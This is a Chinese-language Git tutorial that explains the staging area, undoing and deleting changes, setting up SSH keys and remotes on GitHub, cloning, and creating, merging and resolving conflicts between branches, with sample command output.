<p>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。<br><img src="https://mfaying.github.io/static/images/hbase/2.jpg" alt></p>
<p>分支和HEAD的概念我们以后再讲。</p>
<p>前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的：</p>
<p>第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区；</p>
<p>第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p>
<p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，git commit就是往master分支上提交更改。</p>
<p>你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p>
<h2 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h2><p>现在，假定你已经完全掌握了暂存区的概念。下面，我们要讨论的就是，为什么Git比其他版本控制系统设计得优秀，因为Git跟踪并管理的是修改，而非文件。</p>
<p>你会问，什么是修改？比如你新增了一行，这就是一个修改，删除了一行，也是一个修改，更改了某些字符，也是一个修改，删了一些又加了一些，也是一个修改，甚至创建一个新文件，也算一个修改。</p>
<p>为什么说Git管理的是修改，而不是文件呢？我们还是做实验。第一步，对readme.txt做一个修改，比如加一行内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes.</span><br></pre></td></tr></table></figure></p>
<p>然后，添加：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line">$ git status</span><br><span class="line"># On branch master</span><br><span class="line"># Changes to be committed:</span><br><span class="line">#   (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line">#</span><br><span class="line">#       modified:   readme.txt</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p>
<p>然后，再修改readme.txt：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt </span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br></pre></td></tr></table></figure></p>
<p>提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git commit -m &quot;git tracks changes&quot;</span><br><span class="line">[master 519219b] git tracks changes</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>提交后，再看看状态：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	modified:   readme.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></p>
<p>咦，怎么第二次的修改没有被提交？<br>第一次修改 -&gt; git add -&gt; 第二次修改 -&gt; git commit<br>你看，我们前面讲了，Git管理的是修改，当你用git add命令后，在工作区的第一次修改被放入暂存区，准备提交，但是，在工作区的第二次修改并没有放入暂存区，所以，git commit只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。</p>
<p>提交后，用git diff HEAD – readme.txt命令可以查看工作区和版本库里面最新版本的区别：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git diff HEAD -- readme.txt </span><br><span class="line">diff --git a/readme.txt b/readme.txt</span><br><span class="line">index 76d770f..a9c5755 100644</span><br><span class="line">--- a/readme.txt</span><br><span class="line">+++ b/readme.txt</span><br><span class="line">@@ -1,4 +1,4 @@</span><br><span class="line"> Git is a distributed version control system.</span><br><span class="line"> Git is free software distributed under the GPL.</span><br><span class="line"> Git has a mutable index called stage.</span><br><span class="line">-Git tracks changes.</span><br><span class="line">+Git tracks changes of files.</span><br></pre></td></tr></table></figure></p>
<p>可见，第二次修改确实没有被提交。</p>
<p>那怎么提交第二次修改呢？你可以继续git add再git commit，也可以别着急提交第一次修改，先git add第二次修改，再git commit，就相当于把两次修改合并后一块提交了：</p>
<p>第一次修改 -&gt; git add -&gt; 第二次修改 -&gt; git add -&gt; git commit</p>
<h2 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h2><p>在readme.txt中添加了一行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">My stupid boss still prefers SVN.</span><br></pre></td></tr></table></figure></p>
<p>使用 git checkout – file可以丢弃工作区的修改：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -- readme.txt</span><br></pre></td></tr></table></figure></p>
<p>命令git checkout – readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况：</p>
<p>一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p>
<p>一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p>
<p>总之，就是让这个文件回到最近一次git commit或git add时的状态。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br></pre></td></tr></table></figure></p>
<p>文件内容果然复原了。</p>
<p>git checkout – file命令中的–很重要，没有–，就变成了“切换到另一个分支”的命令，我们在后面的分支管理中会再次遇到git checkout命令。</p>
<p>现在假定是凌晨3点，你不但写了一些胡话，还git add到暂存区了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat readme.txt</span><br><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">My stupid boss still prefers SVN.</span><br><span class="line"></span><br><span class="line">$ git add readme.txt</span><br></pre></td></tr></table></figure></p>
<p>庆幸的是，在commit之前，你发现了这个问题。用git status查看一下，修改只是添加到了暂存区，还没有提交.</p>
<p>Git同样告诉我们，用命令git reset HEAD <code>&lt;file&gt;</code>可以把暂存区的修改撤销掉（unstage），重新放回工作区：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git reset HEAD readme.txt</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M	readme.txt</span><br></pre></td></tr></table></figure></p>
<p>git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。</p>
<p>再丢弃工作区的修改<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -- readme.txt</span><br><span class="line"></span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure></p>
<h2 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h2><p>在Git中，删除也是一个修改操作，一般情况下，你通常直接在文件管理器中把没用的文件删了，或者用rm命令删了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ rm test.txt</span><br></pre></td></tr></table></figure></p>
<p>这个时候，Git知道你删除了文件，因此，工作区和版本库就不一致了，git status命令会立刻告诉你哪些文件被删除了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">	deleted:    test.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></p>
<p>现在你有两个选择，一是确实要从版本库中删除该文件，那就用命令git rm删掉，并且git commit：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git rm test.txt</span><br><span class="line">rm &apos;test.txt&apos;</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;remove test.txt&quot;</span><br><span class="line">[master d46f35e] remove test.txt</span><br><span class="line"> 1 file changed, 1 deletion(-)</span><br><span class="line"> delete mode 100644 test.txt</span><br></pre></td></tr></table></figure></p>
<p>现在，文件就从版本库中被删除了。</p>
<p>先手动删除文件，然后使用git rm <code>&lt;file&gt;</code>和git add<code>&lt;file&gt;</code>效果是一样的。</p>
<p>另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -- test.txt</span><br></pre></td></tr></table></figure></p>
<p>git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。</p>
<p>注意：从来没有被添加到版本库就被删除的文件，是无法恢复的！</p>
<h1 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h1><p>Git是分布式版本控制系统，同一个Git仓库，可以分布到不同的机器上。怎么分布呢？最早，肯定只有一台机器有一个原始版本库，此后，别的机器可以“克隆”这个原始版本库，而且每台机器的版本库其实都是一样的，并没有主次之分。</p>
<p>找一台电脑充当服务器的角色，每天24小时开机，其他每个人都从这个“服务器”仓库克隆一份到自己的电脑上，并且各自把各自的提交推送到服务器仓库里，也从服务器仓库中拉取别人的提交。</p>
<p>GitHub这个网站就是提供Git仓库托管服务的，所以，只要注册一个GitHub账号，就可以免费获得Git远程仓库。</p>
<p>在继续阅读后续内容前，请自行注册GitHub账号。由于你的本地Git仓库和GitHub仓库之间的传输是通过SSH加密的，所以，需要一点设置：</p>
<p>第1步：创建SSH Key。在用户主目录下，看看有没有.ssh目录，如果有，再看看这个目录下有没有id_rsa和id_rsa.pub这两个文件，如果已经有了，可直接跳到下一步。如果没有，打开Shell（Windows下打开Git Bash），创建SSH Key：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;youremail@example.com&quot;</span><br></pre></td></tr></table></figure></p>
<p>你需要把邮件地址换成你自己的邮件地址，然后一路回车，使用默认值即可.</p>
<p>如果一切顺利的话，可以在用户主目录里找到.ssh目录，里面有id_rsa和id_rsa.pub两个文件，这两个就是SSH Key的秘钥对，id_rsa是私钥，不能泄露出去，id_rsa.pub是公钥，可以放心地告诉任何人。</p>
<p>第2步：登陆GitHub，打开“Account settings”，“SSH Keys”页面：</p>
<p>然后，点“Add SSH Key”，填上任意Title，在Key文本框里粘贴id_rsa.pub文件的内容</p>
<p>点“Add Key”，你就应该看到已经添加的Key.</p>
<p>为什么GitHub需要SSH Key呢？因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。</p>
<p>当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。</p>
<p>如果你不想让别人看到Git库，有两个办法，一个是交点保护费，让GitHub把公开的仓库变成私有的，这样别人就看不见了（不可读更不可写）。另一个办法是自己动手，搭一个Git服务器，因为是你自己的Git服务器，所以别人也是看不见的。这个方法我们后面会讲到的，相当简单，公司内部开发必备。</p>
<p>确保你拥有一个GitHub账号后，我们就即将开始远程仓库的学习。</p>
<h2 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h2><p>现在的情景是，你已经在本地创建了一个Git仓库后，又想在GitHub创建一个Git仓库，并且让这两个仓库进行远程同步，这样，GitHub上的仓库既可以作为备份，又可以让其他人通过该仓库来协作，真是一举多得。</p>
<p>首先，登陆GitHub，然后，在右上角找到“Create a new repo”按钮，创建一个新的仓库</p>
<p>在Repository name填入learngit，其他保持默认设置，点击“Create repository”按钮，就成功地创建了一个新的Git仓库</p>
<p>目前，在GitHub上的这个learngit仓库还是空的，GitHub告诉我们，可以从这个仓库克隆出新的仓库，也可以把一个已有的本地仓库与之关联，然后，把本地仓库的内容推送到GitHub仓库。</p>
<p>现在，我们根据GitHub的提示，在本地的learngit仓库下运行命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git remote add origin git@github.com:michaelliao/learngit.git</span><br></pre></td></tr></table></figure></p>
<p>请千万注意，把上面的michaelliao替换成你自己的GitHub账户名，否则，你在本地关联的就是我的远程库，关联没有问题，但是你以后推送是推不上去的，因为你的SSH Key公钥不在我的账户列表中。</p>
<p>添加后，远程库的名字就是origin，这是Git默认的叫法，也可以改成别的，但是origin这个名字一看就知道是远程库。</p>
<p>下一步，就可以把本地库的所有内容推送到远程库上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push -u origin master</span><br><span class="line">Counting objects: 20, done.</span><br><span class="line">Delta compression using up to 4 threads.</span><br><span class="line">Compressing objects: 100% (15/15), done.</span><br><span class="line">Writing objects: 100% (20/20), 1.64 KiB | 560.00 KiB/s, done.</span><br><span class="line">Total 20 (delta 5), reused 0 (delta 0)</span><br><span class="line">remote: Resolving deltas: 100% (5/5), done.</span><br><span class="line">To github.com:michaelliao/learngit.git</span><br><span class="line"> * [new branch]      master -&gt; master</span><br><span class="line">Branch &apos;master&apos; set up to track remote branch &apos;master&apos; from &apos;origin&apos;.</span><br></pre></td></tr></table></figure></p>
<p>把本地库的内容推送到远程，用git push命令，实际上是把当前分支master推送到远程。</p>
<p>由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令。</p>
<p>推送成功后，可以立刻在GitHub页面中看到远程库的内容已经和本地一模一样.</p>
<p>从现在起，只要本地作了提交，就可以通过命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure></p>
<p>把本地master分支的最新修改推送至GitHub，现在，你就拥有了真正的分布式版本库！</p>
<p>SSH警告</p>
<p>当你第一次使用Git的clone或者push命令连接GitHub时，会得到一个警告：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The authenticity of host &apos;github.com (xx.xx.xx.xx)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is xx.xx.xx.xx.xx.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure></p>
<p>这是因为Git使用SSH连接，而SSH连接在第一次验证GitHub服务器的Key时，需要你确认GitHub的Key的指纹信息是否真的来自GitHub的服务器，输入yes回车即可。</p>
<p>Git会输出一个警告，告诉你已经把GitHub的Key添加到本机的一个信任列表里了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &apos;github.com&apos; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure></p>
<p>这个警告只会出现一次，后面的操作就不会有任何警告了。</p>
<p>如果你实在担心有人冒充GitHub服务器，输入yes前可以对照GitHub的RSA Key的指纹信息是否与SSH连接给出的一致。</p>
<h1 id="从远程库克隆"><a href="#从远程库克隆" class="headerlink" title="从远程库克隆"></a>从远程库克隆</h1><p>上次我们讲了先有本地库，后有远程库的时候，如何关联远程库。</p>
<p>现在，假设我们从零开发，那么最好的方式是先创建远程库，然后，从远程库克隆。</p>
<p>首先，登陆GitHub，创建一个新的仓库，名字叫gitskills</p>
<p>我们勾选Initialize this repository with a README，这样GitHub会自动为我们创建一个README.md文件。创建完毕后，可以看到README.md文件</p>
<p>现在，远程库已经准备好了，下一步是用命令git clone克隆一个本地库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git clone git@github.com:michaelliao/gitskills.git</span><br><span class="line">Cloning into &apos;gitskills&apos;...</span><br><span class="line">remote: Counting objects: 3, done.</span><br><span class="line">remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 3</span><br><span class="line">Receiving objects: 100% (3/3), done.</span><br></pre></td></tr></table></figure>
<p>注意把Git库的地址换成你自己的，然后进入gitskills目录看看，已经有README.md文件了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd gitskills</span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br></pre></td></tr></table></figure></p>
<p>如果有多个人协作开发，那么每个人各自从远程克隆一份就可以了。</p>
<p>你也许还注意到，GitHub给出的地址不止一个，还可以用<a href="https://github.com/michaelliao/gitskills.git这样的地址。实际上，Git支持多种协议，默认的git://使用ssh，但也可以使用https等其他协议。" target="_blank" rel="noopener">https://github.com/michaelliao/gitskills.git这样的地址。实际上，Git支持多种协议，默认的git://使用ssh，但也可以使用https等其他协议。</a></p>
<p>使用https除了速度慢以外，还有个最大的麻烦是每次推送都必须输入口令，但是在某些只开放http端口的公司内部就无法使用ssh协议而只能用https。</p>
<h1 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h1><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p>
<p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p>
<p>Git的分支无论创建、切换和删除分支，速度都非常快。</p>
<h1 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h1><p>在版本回退里，你已经知道，每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里，这个分支叫主分支，即master分支。HEAD严格来说不是指向提交，而是指向master，master才是指向提交的，所以，HEAD指向的就是当前分支。</p>
<p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：<br><img src="https://mfaying.github.io/static/images/hbase/3.jpg" alt></p>
<p>每次提交，master分支都会向前移动一步，这样，随着你不断提交，master分支的线也越来越长。</p>
<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：<br><img src="https://mfaying.github.io/static/images/hbase/4.jpg" alt></p>
<p>你看，Git创建一个分支很快，因为除了增加一个dev指针，改改HEAD的指向，工作区的文件都没有任何变化！</p>
<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：<br><img src="https://mfaying.github.io/static/images/hbase/5.jpg" alt></p>
<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：<br><img src="https://mfaying.github.io/static/images/hbase/6.jpg" alt></p>
<p>所以Git合并分支也很快！就改改指针，工作区内容也不变！</p>
<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：<br><img src="https://mfaying.github.io/static/images/hbase/7.jpg" alt></p>
<p>真是太神奇了，你看得出来有些提交是通过分支完成的吗？</p>
<p>下面开始实战。</p>
<p>首先，我们创建dev分支，然后切换到dev分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev</span><br><span class="line">Switched to a new branch &apos;dev&apos;</span><br></pre></td></tr></table></figure></p>
<p>git checkout命令加上-b参数表示创建并切换，相当于以下两条命令：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch dev</span><br><span class="line">$ git checkout dev</span><br><span class="line">Switched to branch &apos;dev&apos;</span><br></pre></td></tr></table></figure></p>
<p>然后，用git branch命令查看当前分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* dev</span><br><span class="line">  master</span><br></pre></td></tr></table></figure></p>
<p>git branch命令会列出所有分支，当前分支前面会标一个*号。</p>
<p>然后，我们就可以在dev分支上正常提交，比如对readme.txt做个修改，加上一行：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick.</span><br></pre></td></tr></table></figure></p>
<p>然后提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;branch test&quot;</span><br><span class="line">[dev b17d20e] branch test</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>现在，dev分支的工作完成，我们就可以切换回master分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br></pre></td></tr></table></figure></p>
<p>切换回master分支后，再查看一个readme.txt文件，刚才添加的内容不见了！因为那个提交是在dev分支上，而master分支此刻的提交点并没有变：<br><img src="https://mfaying.github.io/static/images/hbase/8.jpg" alt></p>
<p>现在，我们把dev分支的工作成果合并到master分支上：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge dev</span><br><span class="line">Updating d46f35e..b17d20e</span><br><span class="line">Fast-forward</span><br><span class="line"> readme.txt | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>git merge命令用于合并指定分支到当前分支。合并后，再查看readme.txt的内容，就可以看到，和dev分支的最新提交是完全一样的。</p>
<p>注意到上面的Fast-forward信息，Git告诉我们，这次合并是“快进模式”，也就是直接把master指向dev的当前提交，所以合并速度非常快。</p>
<p>当然，也不是每次合并都能Fast-forward，我们后面会讲其他方式的合并。</p>
<p>合并完成后，就可以放心地删除dev分支了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d dev</span><br><span class="line">Deleted branch dev (was b17d20e).</span><br></pre></td></tr></table></figure></p>
<p>删除后，查看branch，就只剩下master分支了：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch</span><br><span class="line">* master</span><br></pre></td></tr></table></figure></p>
<p>因为创建、合并和删除分支非常快，所以Git鼓励你使用分支完成某个任务，合并后再删掉分支，这和直接在master分支上工作效果是一样的，但过程更安全。</p>
<h2 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h2><p>合并分支往往也不是一帆风顺的。</p>
<p>准备新的feature1分支，继续我们的新分支开发：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b feature1</span><br><span class="line">Switched to a new branch &apos;feature1&apos;</span><br></pre></td></tr></table></figure></p>
<p>修改readme.txt最后一行，改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick AND simple.</span><br></pre></td></tr></table></figure></p>
<p>在feature1分支上提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt</span><br><span class="line"></span><br><span class="line">$ git commit -m &quot;AND simple&quot;</span><br><span class="line">[feature1 14096d0] AND simple</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure></p>
<p>切换到master分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br><span class="line">Your branch is ahead of &apos;origin/master&apos; by 1 commit.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br></pre></td></tr></table></figure></p>
<p>Git还会自动提示我们当前master分支比远程的master分支要超前1个提交。</p>
<p>在master分支上把readme.txt文件的最后一行改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick &amp; simple.</span><br></pre></td></tr></table></figure></p>
<p>提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;&amp; simple&quot;</span><br><span class="line">[master 5dc6824] &amp; simple</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br></pre></td></tr></table></figure></p>
<p>现在，master分支和feature1分支各自都分别有新的提交，变成了这样：<br><img src="https://mfaying.github.io/static/images/hbase/9.jpg" alt></p>
<p>这种情况下，Git无法执行“快速合并”，只能试图把各自的修改合并起来，但这种合并就可能会有冲突，我们试试看：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge feature1</span><br><span class="line">Auto-merging readme.txt</span><br><span class="line">CONFLICT (content): Merge conflict in readme.txt</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure></p>
<p>果然冲突了！Git告诉我们，readme.txt文件存在冲突，必须手动解决冲突后再提交。git status也可以告诉我们冲突的文件：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">Your branch is ahead of &apos;origin/master&apos; by 2 commits.</span><br><span class="line">  (use &quot;git push&quot; to publish your local commits)</span><br><span class="line"></span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run &quot;git commit&quot;)</span><br><span class="line">  (use &quot;git merge --abort&quot; to abort the merge)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to mark resolution)</span><br><span class="line"></span><br><span class="line">	both modified:   readme.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></p>
<p>我们可以直接查看readme.txt的内容：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Git is a distributed version control system.</span><br><span class="line">Git is free software distributed under the GPL.</span><br><span class="line">Git has a mutable index called stage.</span><br><span class="line">Git tracks changes of files.</span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span><br><span class="line">Creating a new branch is quick &amp; simple.</span><br><span class="line">=======</span><br><span class="line">Creating a new branch is quick AND simple.</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</span><br></pre></td></tr></table></figure></p>
<p>Git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容，我们修改如下后保存：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Creating a new branch is quick and simple.</span><br></pre></td></tr></table></figure></p>
<p>再提交：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;conflict fixed&quot;</span><br><span class="line">[master cf810e4] conflict fixed</span><br></pre></td></tr></table></figure></p>
<p>现在，master分支和feature1分支变成了下图所示：<br><img src="https://mfaying.github.io/static/images/hbase/10.jpg" alt></p>
<p>用带参数的git log也可以看到分支的合并情况：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git log --graph --pretty=oneline --abbrev-commit</span><br><span class="line">*   cf810e4 (HEAD -&gt; master) conflict fixed</span><br><span class="line">|\  </span><br><span class="line">| * 14096d0 (feature1) AND simple</span><br><span class="line">* | 5dc6824 &amp; simple</span><br><span class="line">|/  </span><br><span class="line">* b17d20e branch test</span><br><span class="line">* d46f35e (origin/master) remove test.txt</span><br><span class="line">* b84166e add test.txt</span><br><span class="line">* 519219b git tracks changes</span><br><span class="line">* e43a48b understand how stage works</span><br><span class="line">* 1094adb append GPL</span><br><span class="line">* e475afc add distributed</span><br><span class="line">* eaadf4e wrote a readme file</span><br></pre></td></tr></table></figure></p>
<p>最后，删除feature1分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git branch -d feature1</span><br><span class="line">Deleted branch feature1 (was 14096d0).</span><br></pre></td></tr></table></figure></p>
<p>工作完成。</p>
<h2 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h2><p>通常，合并分支时，如果可能，Git会用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。</p>
<p>如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</p>
<p>下面我们实战一下–no-ff方式的git merge：</p>
<p>首先，仍然创建并切换dev分支：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout -b dev</span><br><span class="line">Switched to a new branch &apos;dev&apos;</span><br></pre></td></tr></table></figure></p>
<p>修改readme.txt文件，并提交一个新的commit：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git add readme.txt </span><br><span class="line">$ git commit -m &quot;add merge&quot;</span><br><span class="line">[dev f52c633] add merge</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>现在，我们切换回master：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git checkout master</span><br><span class="line">Switched to branch &apos;master&apos;</span><br></pre></td></tr></table></figure></p>
<p>准备合并dev分支，请注意–no-ff参数，表示禁用Fast forward：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</span><br><span class="line">Merge made by the &apos;recursive&apos; strategy.</span><br><span class="line"> readme.txt | 1 +</span><br><span class="line"> 1 file changed, 1 insertion(+)</span><br></pre></td></tr></table></figure></p>
<p>因为本次合并要创建一个新的commit，所以加上-m参数，把commit描述写进去。</p>
